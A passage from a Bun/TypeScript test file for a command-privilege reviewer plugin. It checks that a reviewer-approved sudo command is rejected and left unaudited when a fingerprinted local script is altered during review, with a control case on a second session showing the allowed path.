    )
    expect(reminders).toHaveLength(1)
    const allowedTrace = await waitForTrace(home, (text) => text.includes("privilege_host_direct"))
    expect(allowedTrace).toContain('"kind":"privilege_host_direct"')
    expect(allowedTrace).toContain('"decision":"ALLOW"')
  })

  test("a dynamic ALLOW whose fingerprint check fails rejects the call and writes no host-direct reminder or audit line", async () => {
    if (process.env.PRIVILEGE_TRACE_CHILD !== "1") {
      // Same throwaway-HOME re-exec pattern as above: the reviewer trace
      // lands in ~/.opencode/reviewer-trace.jsonl and bun reads $HOME only
      // at process startup, so the scenario runs in a child bun process.
      const home = await mkdtemp(path.join("/tmp/opencode/", "privilege-trace-home-"))
      try {
        const child = Bun.spawnSync({
          cmd: [
            process.execPath,
            "test",
            import.meta.path,
            "-t",
            "a dynamic ALLOW whose fingerprint check fails rejects the call and writes no host-direct reminder or audit line",
          ],
          env: { ...process.env, HOME: home, PRIVILEGE_TRACE_CHILD: "1" },
          stdout: "pipe",
          stderr: "pipe",
        })
        expect(child.exitCode).toBe(0)
      } finally {
        await rm(home, { recursive: true, force: true })
      }
      return
    }

    // --- child body: HOME is a throwaway directory, trace writes land there.
    const home = homedir()
    const dir = await ensureWorkdir()
    // Local scripts referenced by the commands: the classifier fingerprints
    // them, so rewriting one inside the ALLOWING review callback makes the
    // post-review verifyScriptFingerprints fail.
    const mutatedScript = path.join(dir, "privilege-fingerprint-mutated.sh")
    await writeFile(mutatedScript, "#!/bin/bash\necho original\n")
    const stableScript = path.join(dir, "privilege-fingerprint-stable.sh")
    await writeFile(stableScript, "#!/bin/bash\necho stable\n")

    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: true,
      reviewCommand: async (request: { command?: string }) => {
        const command = request.command ?? ""
        h.dynamicCalls.push({ command })
        if (command.includes("privilege-fingerprint-mutated")) {
          await writeFile(mutatedScript, "#!/bin/bash\necho changed after review\n")
        }
        return { decision: "ALLOW" as const, categories: [] }
      },
    })

    // The reviewer ALLOWs, but the fingerprinted local script changed during
    // the review, so the post-review fingerprint check fails: the call is
    // rejected and must not be recorded as having run host-direct.
    await invoke(h, "bypass", "s1", "host privilege")
    const mutatedCommand = "sudo chown www-data:www-data /srv/app/config.yml && bash ./privilege-fingerprint-mutated.sh"
    const blocked = await runBefore(h, "s1", { command: mutatedCommand })
    expect(blocked).toContain("Local script changed after review")
    // The dynamic reviewer was consulted for this call (dynamic-ALLOW path).
    expect(h.dynamicCalls.some((call) => call.command === mutatedCommand)).toBe(true)
    expect(h.synthetic.some((s) => s.text.includes("this command needs OS privilege"))).toBe(false)

    // Positive control on a fresh session: same shape, untouched script —
    // the fingerprint check passes and both observables are written once.
    await invoke(h, "bypass", "s2", "host privilege")
    const stableCommand = "sudo chown www-data:www-data /srv/app/config.yml && bash ./privilege-fingerprint-stable.sh"
    const allowed = await runBefore(h, "s2", { command: stableCommand })
    expect(allowed).toBeUndefined()
    const reminders = h.synthetic.filter(
      (s) =>
        s.sessionID === "s2" &&
        s.text.includes("this command needs OS privilege") &&
        s.text.includes("without the OS sandbox wrap"),
    )
    expect(reminders).toHaveLength(1)

    // Exactly one privilege_host_direct audit line: for the allowed s2 call,
    // never for the fingerprint-rejected s1 call.
    const trace = await waitForTrace(home, (text) => text.includes('"kind":"privilege_host_direct"'))
    const hostDirectLines = trace
      .split("\n")
      .filter((line) => line.includes('"kind":"privilege_host_direct"'))
    expect(hostDirectLines).toHaveLength(1)
    expect(hostDirectLines[0]).toContain(stableCommand)
    expect(hostDirectLines[0]).not.toContain("privilege-fingerprint-mutated")
  })
})
